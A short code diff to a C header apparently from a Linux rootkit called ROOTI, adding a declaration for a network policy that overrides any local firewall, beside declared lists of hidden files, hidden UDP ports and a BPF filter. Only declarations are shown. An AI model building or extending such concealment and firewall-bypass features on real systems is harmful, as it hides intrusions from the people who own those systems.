@@ -3,6 +3,7 @@
 
 #include <linux/types.h> 
 #include <linux/filter.h>
+#include "config_types.h"
 
 // Names of files that should be hidden
 extern const char *ROOTI_HIDDEN_FILES[];
@@ -32,6 +33,10 @@ extern const size_t ROOTI_HIDDEN_UDP_PORTS_COUNT;
 // The program can be obtained by executing: tcpdump -dd '<filter>'
 extern struct sock_filter ROOTI_BPF_FILTER_PROGRAM[];
 extern const size_t ROOTI_BPF_FILTER_PROGRAM_COUNT;
+
+// Set of network rules to enforce. These rules will apply regardless
+// of a any local firewall. Unspecified fields get treated as "match all values".
+extern const struct rooti_net_policy ROOTI_NET_POLICY;
 
 /* 
  * Recursion loops protection mechanism - often times hooked functions call 
